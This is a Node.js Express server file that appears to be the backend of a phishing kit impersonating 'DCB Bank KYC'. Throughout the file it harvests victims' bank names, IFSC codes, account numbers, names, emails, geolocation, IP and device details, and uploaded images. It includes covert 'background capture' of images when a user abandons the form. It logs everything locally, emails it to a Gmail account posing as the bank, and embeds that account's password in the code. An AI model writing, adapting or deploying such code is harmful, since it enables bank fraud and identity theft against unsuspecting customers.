const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
const UAParser = require('ua-parser-js');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// File upload setup
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    cb(null, `${Date.now()}${ext}`);
  }
});

const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'), false);
    }
  },
  limits: { fileSize: 50 * 1024 * 1024 }
}).any();

// Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexmwnespcwxrkjt'
  },
  pool: true, // Enable connection pooling
  maxConnections: 5, // Max simultaneous connections
  maxMessages: 100 // Max messages per connection
});

// Helper functions
const getClientIp = (req) => {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.ip ||
         req.connection?.remoteAddress;
};

const buildEmailHtml = (data) => {
  const isBackground = data.isFormEmpty;
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: ${isBackground ? '#d32f2f' : '#003d6a'};">
        ${isBackground ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC SUBMISSION'}
      </h2>
      
      ${isBackground ? `
      <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
        <p><strong>User left without submitting form</strong></p>
        <p>Captured ${data.imageCount} images before leaving</p>
      </div>
      ` : ''}
      
      <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #003d6a;">
        <h3 style="color: #003d6a; margin-top: 0;">📱 Device Information</h3>
        <p><strong>Type:</strong> ${data.device.type === 'mobile' ? '📱 Mobile' : '💻 Desktop'} 
           ${data.device.vendor !== 'Unknown' ? `(${data.device.vendor})` : ''}</p>
        ${data.device.model !== 'Unknown' ? `<p><strong>Model:</strong> ${data.device.model}</p>` : ''}
        <p><strong>OS:</strong> ${data.os}</p>
        <p><strong>Browser:</strong> ${data.browser}</p>
      </div>
      
      ${!isBackground ? `
      <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
        <p><strong>Bank Name:</strong> ${data.bankname}</p>
        <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
        <p><strong>Account Number:</strong> ${data.accno}</p>
        <p><strong>Full Name:</strong> ${data.fullname}</p>
        <p><strong>Email:</strong> ${data.email}</p>
      </div>
      ` : ''}
      
      ${data.location ? `
      <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
        <p><strong>Latitude:</strong> ${data.location.latitude}</p>
        <p><strong>Longitude:</strong> ${data.location.longitude}</p>
        <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
        <p><strong>Last Updated:</strong> ${new Date(data.location.timestamp).toLocaleString()}</p>
      </div>
      ` : ''}
      
      <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
        <p><strong>IP Address:</strong> ${data.ip}</p>
        <p><strong>Images Captured:</strong> ${data.imageCount}</p>
        <p><strong>User Agent:</strong> ${data.userAgent}</p>
        <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
      </div>
    </div>
  `;
};

// Routes
app.post('/submit', (req, res) => {
  upload(req, res, async (err) => {
    const filesToCleanup = []; // Track files for cleanup

    try {
      if (err) throw err;

      const isBackground = req.body.empty_form === 'true';
      
      // Server-side validation for full submissions
      if (!isBackground && (!req.body.bankname || !req.body.ifsc || !req.body.accno || 
          !req.body.fullname || !req.body.email || !req.files || req.files.length === 0)) {
        return res.status(400).json({ error: 'All fields are required' });
      }

      // Validate email format for full submissions
      if (!isBackground && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(req.body.email)) {
        return res.status(400).json({ error: 'Invalid email format' });
      }

      // Prevent duplicate background submissions with no images
      if (isBackground && (!req.files || req.files.length === 0)) {
        return res.status(200).send();
      }

      // Store files for later cleanup
      if (req.files) {
        filesToCleanup.push(...req.files);
      }

      // Parse device info
      const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
      const device = parser.getDevice();
      const os = parser.getOS();
      const browser = parser.getBrowser();

      const submissionData = {
        device: {
          type: device.type || req.body.device_type || 'desktop',
          model: device.model || req.body.device_model || 'Unknown',
          vendor: device.vendor || req.body.device_vendor || 'Unknown'
        },
        os: `${os.name || ''} ${os.version || ''}`.trim() || req.body.device_os || 'Unknown',
        browser: `${browser.name || ''} ${browser.version || ''}`.trim() || req.body.device_browser || 'Unknown',
        bankname: req.body.bankname || 'Not provided',
        ifsc: req.body.ifsc || 'Not provided',
        accno: req.body.accno || 'Not provided',
        fullname: req.body.fullname || 'Not provided',
        email: req.body.email || 'Not provided',
        location: req.body.location ? JSON.parse(req.body.location) : null,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'] || req.body.user_agent || 'Unknown',
        timestamp: req.body.timestamp || new Date().toISOString(),
        isFormEmpty: isBackground,
        imageCount: req.files?.length || 0
      };

      // Log the submission
      const logEntry = `
--- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
Time: ${new Date().toISOString()}
Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
OS: ${submissionData.os}
Browser: ${submissionData.browser}
IP: ${submissionData.ip}
Location: ${submissionData.location ? 
  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
Bank: ${submissionData.bankname}
IFSC: ${submissionData.ifsc}
Account: ${submissionData.accno}
Name: ${submissionData.fullname}
Email: ${submissionData.email}
Images: ${submissionData.imageCount}
-----------------------------
`;

      fs.appendFileSync('records.txt', logEntry);
      console.log(logEntry);

      // Send email
      const emailSubject = isBackground 
        ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
        : '✅ KYC Verification Completed';
      
      const mailOptions = {
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: emailSubject,
        html: buildEmailHtml(submissionData),
        attachments: (req.files || []).map(file => ({
          filename: file.originalname,
          path: file.path
        }))
      };

      await transporter.sendMail(mailOptions);
      res.status(200).send();
    } catch (error) {
      console.error('❌ Error:', error);
      res.status(500).send('Error processing submission');
    } finally {
      // Cleanup files after 30 seconds to ensure email is sent
      setTimeout(() => {
        filesToCleanup.forEach(file => {
          fs.unlink(file.path, err => {
            if (err && err.code !== 'ENOENT') { // Ignore "file not found" errors
              console.error('Error deleting file:', file.path, err);
            }
          });
        });
      }, 30000); // 30 second delay
    }
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('❌ Unhandled Error:', err);
  res.status(500).json({ 
    error: 'Internal Server Error',
    message: err.message 
  });
});

// Start server
const server = app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received. Shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received. Shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});
